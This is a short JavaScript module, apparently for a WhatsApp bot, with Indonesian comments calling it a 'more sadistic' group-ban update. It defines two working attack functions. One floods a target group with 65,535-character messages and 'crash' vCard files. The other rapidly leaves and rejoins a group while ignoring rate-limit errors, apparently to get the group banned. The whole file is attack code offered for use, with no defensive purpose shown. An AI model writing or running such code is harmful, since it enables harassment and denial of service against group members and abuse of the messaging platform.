// ==========================================
// UPDATE: BAN GRUP - LEBIH SADIS & GACOR
// ==========================================

// 1. Mode CRASH GRUP (Massive Payload Injection)
async function banGrupCrash(sock, groupId) {
    const massiveText = 'A'.repeat(65535); 
    const dummyVcf = 'BEGIN:VCARD\nVERSION:3.0\nFN:BOMB\nTEL;TYPE=CELL:+628123456789\nEND:VCARD';
    const loop = 15; 
    for (let i = 0; i < loop; i++) {
        await sock.sendMessage(groupId, { text: massiveText + ` [${i}]` });
        await sock.sendMessage(groupId, { document: Buffer.from(dummyVcf), mimetype: 'text/vcard', fileName: `crash${i}.vcf` });
        await new Promise(r => setTimeout(r, 200)); 
    }
}

// 2. Mode BAN (Aggressive Join/Leave Flood)
async function banGrupBan(sock, groupId, inviteCode) {
    const loop = 60; 
    for (let i = 0; i < loop; i++) {
        try {
            await sock.groupLeave(groupId);
            await sock.groupAcceptInvite(inviteCode); 
        } catch (e) {
            // Abaikan error rate limit
        }
        await new Promise(r => setTimeout(r, 50)); 
    }
}

module.exports = { banGrupCrash, banGrupBan };
